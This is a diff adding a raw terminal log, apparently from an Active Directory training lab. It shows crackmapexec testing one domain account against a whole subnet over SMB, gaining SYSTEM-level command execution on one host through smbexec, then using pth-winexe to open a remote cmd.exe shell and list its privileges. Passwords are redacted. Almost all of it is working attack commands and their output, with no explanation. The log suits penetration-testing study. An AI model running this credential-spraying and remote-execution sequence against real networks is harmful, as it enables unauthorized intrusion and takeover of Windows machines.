@@ -1,0 +1,56 @@
+┌─[root@pivot]─[/tmp]
+└──╼ #cme smb 192.168.234.2-254 -u student141 -p "SNIPPED" -x whoami --exec-method smbexec
+SMB         192.168.234.140 445    DCORP-DC         [*] Windows Server 2019 Standard 17763 x64 (name:DCORP-DC) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:True)
+SMB         192.168.234.137 445    DC               [*] Windows Server 2019 Standard 17763 x64 (name:DC) (domain:moneycorp.local) (signing:False) (SMBv1:True)
+SMB         192.168.234.183 445    WINDOWSPIVOT     [*] Windows 10 Pro N for Workstations 19042 x64 (name:WINDOWSPIVOT) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:True)
+SMB         192.168.234.150 445    CI               [*] Windows 10 Education N 19042 x64 (name:CI) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:True)
+SMB         192.168.234.140 445    DCORP-DC         [+] dollarcorp.moneycorp.local\student141:SNIPPED 
+SMB         192.168.234.137 445    DC               [-] moneycorp.local\student141:SNIPPED STATUS_LOGON_FAILURE 
+SMB         192.168.234.183 445    WINDOWSPIVOT     [+] dollarcorp.moneycorp.local\student141:SNIPPED (Pwn3d!)
+ERROR:impacket.smbserver:processRequest (0xe,('Trying to pack None', "When packing field 'CreationTime | <q' in <class 'impacket.smb.SMBFindFileBothDirectoryInfo'>"))
+SMB         192.168.234.150 445    CI               [+] dollarcorp.moneycorp.local\student141:SNIPPED 
+SMB         192.168.234.183 445    WINDOWSPIVOT     [+] Executed command via smbexec
+SMB         192.168.234.183 445    WINDOWSPIVOT     nt authority\system
+
+[*] completed: 100.00% (253/253)
+
+┌─[✗]─[root@pivot]─[/tmp]
+└──╼ #pth-winexe //192.168.234.183 --user=dollarcorp/student141%'SNIPPED' cmd.exe
+E_md4hash wrapper called.
+Microsoft Windows [Version 10.0.19042.631]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State  
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+
+C:\Windows\system32>
